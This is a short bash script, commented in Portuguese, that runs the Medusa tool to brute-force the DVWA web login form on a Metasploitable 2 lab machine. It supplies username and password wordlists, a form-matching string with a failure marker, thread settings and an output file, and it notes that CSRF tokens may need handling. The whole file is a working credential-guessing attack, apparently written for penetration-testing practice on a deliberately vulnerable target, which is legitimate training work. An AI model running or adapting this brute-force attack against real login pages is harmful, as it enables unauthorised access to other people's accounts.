#!/bin/bash

# Script para ataque de força bruta DVWA (web-form) com Medusa

TARGET="192.168.56.102" # Substitua pelo IP do Metasploitable 2
USERLIST="wordlists/usernames.txt"
PASSLIST="wordlists/passwords.txt"

# A string FORM deve ser adaptada ao formulário de login do DVWA.
# Exemplo: FORM:"/dvwa/login.php":"username=^USER^&password=^PASS^&Login=Login":F="Login failed"
# Você pode precisar inspecionar o formulário de login do DVWA para obter os nomes exatos dos campos e o valor do botão de submit.
# Além disso, pode ser necessário lidar com tokens CSRF, o que o Medusa pode não fazer nativamente para web-forms complexos.

echo "Iniciando ataque de força bruta DVWA contra $TARGET..."
medusa -h $TARGET -U $USERLIST -P $PASSLIST -M web-form -m FORM:"/dvwa/login.php":"username=^USER^&password=^PASS^&Login=Login":F="Login failed" -t 5 -O dvwa_results.txt
echo "Ataque DVWA concluído. Resultados salvos em dvwa_results.txt"
